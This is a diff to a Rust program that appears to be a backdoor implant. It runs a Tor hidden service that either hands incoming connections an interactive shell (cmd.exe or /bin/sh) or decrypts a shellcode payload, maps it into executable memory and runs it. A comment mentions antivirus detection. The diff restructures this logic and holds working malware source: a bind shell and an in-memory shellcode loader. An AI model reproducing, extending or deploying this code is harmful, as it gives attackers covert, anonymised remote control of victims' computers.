@@ -101,20 +101,35 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
 
     let mut tor_proc = start_tor_binary(&torrc, &setting)?;
 
-    if setting.uses_shellcode {
-        execute_shellcode(&setting)?;
-    } else {
-        for stream in listener.incoming() {
-            match stream {
-                Ok(stream) => {
-                    println!("received connection");
+    for stream in listener.incoming() {
+        match stream {
+            Ok(stream) => {
+                if setting.uses_payload {
+                    // decrypt payload. now the shellcode goes to memory
+                    // and may get detected by AV by now
+                    let payload = setting::get_payload(&setting)?;
+            
+                    // tor hidden service will be our shellcode later,
+                    // so it need to be restarted
+                    tor_proc.kill()?;
+            
+                    // set hidden service port as payload port
+                    unbundle_torrc(&torrc, payload.lport, &setting)?;
+            
+                    // restart tor
+                    tor_proc = start_tor_binary(&torrc, &setting)?;
+            
+                    execute_payload(payload.data)?;
+
+                    break;
+                } else {
                     match bind_shell(stream) {
                         Ok(()) => {},
                         Err(error) => println!("connection error: {:?}", error)
                     };
-                },
-                Err(error) => return Err(Box::new(error))
-            }
+                }
+            },
+            Err(error) => return Err(Box::new(error))
         }
     }
 
@@ -155,13 +170,12 @@ where R: io::Read + Send + 'static,
 fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     let mut args: Vec<&str> = Vec::new();
 
-    let shell;
-    if cfg!(windows) {
-        shell = "cmd.exe";
+    let shell = if cfg!(windows) {
+        "cmd.exe"
     } else {
-        shell = "/bin/sh";
         args.push("-i");
-    }
+        "/bin/sh"
+    };
 
     let proc = Command::new(shell)
         .args(args)
@@ -189,17 +203,17 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     Ok(())
 }
 
-fn execute_shellcode(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
-    let len = setting.shellcode.len();
+fn execute_payload(payload: Vec<u8>) -> Result<(), Box<dyn error::Error>> {
+    let len = payload.len();
 
     // writable memory
     let mut w_map = MmapMut::map_anon(len)?;
 
     unsafe {
         // write shellcode
-        ptr::copy(setting.shellcode.as_ptr(), w_map.as_mut_ptr(), len);
+        ptr::copy(payload.as_ptr(), w_map.as_mut_ptr(), len);
 
-        // transition to read and executable memory
+        // transition to readable/executable memory
         let x_map = w_map.make_exec()?;
 
         let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
